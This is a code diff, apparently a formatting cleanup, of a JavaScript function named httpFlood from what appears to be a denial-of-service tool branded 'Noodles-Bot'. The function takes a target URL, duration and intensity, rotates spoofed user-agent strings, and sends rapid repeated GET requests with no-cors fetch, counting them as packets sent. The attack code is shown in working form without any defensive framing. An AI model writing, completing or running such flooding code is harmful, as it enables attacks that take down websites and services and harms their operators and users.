@@ -8,8 +8,8 @@ async function httpFlood(target, duration, intensity) {
     const url = new URL(target);
     const host = url.hostname;
     const path = url.pathname || '/';
-    let port = url.port;
 
+    let port = url.port;
     if (!port) {
       port = url.protocol === 'https:' ? 443 : 80;
     } else {
@@ -18,7 +18,6 @@ async function httpFlood(target, duration, intensity) {
 
     const protocol = url.protocol === 'https:' ? 'https' : 'http';
     const interval = Math.max(1, 50 / intensity);
-
     const userAgents = [
       'Noodles-Bot v3.0',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -34,15 +33,15 @@ async function httpFlood(target, duration, intensity) {
         const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`;
 
         const promise = fetch(target, {
-            method: 'GET',
-            headers: {
-              'User-Agent': userAgent,
-              'X-Noodles-Bot': 'Active',
-              'Cache-Control': 'no-cache',
-              'Connection': 'keep-alive'
-            },
-            mode: 'no-cors'
-          })
+          method: 'GET',
+          headers: {
+            'User-Agent': userAgent,
+            'X-Noodles-Bot': 'Active',
+            'Cache-Control': 'no-cache',
+            'Connection': 'keep-alive'
+          },
+          mode: 'no-cors',
+        })
           .then(response => {
             if (response.ok) {
               packetsSent++;
